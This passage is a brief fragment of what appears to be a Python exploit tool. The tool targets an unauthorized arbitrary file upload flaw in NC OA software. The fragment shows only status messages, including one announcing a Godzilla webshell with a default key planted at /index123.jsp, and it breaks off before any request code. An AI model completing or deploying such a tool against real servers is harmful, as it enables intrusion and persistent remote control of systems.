...
%>
    ...
    success_msg = now_time() + ' [SUCCESS]文件上传成功'
    shell_msg = now_time() + '哥斯拉默认密钥webshell："+u+"/index123.jsp'
    warning_msg = now_time() + '[WARNING]NC OA未授权任意文件上传漏洞利用失败'
    error_msg = now_time() + '[NC OA未授权任意文件上传漏洞][ERROR]请求失败，可能无法与目标建立连接或目标不存在'
    try:
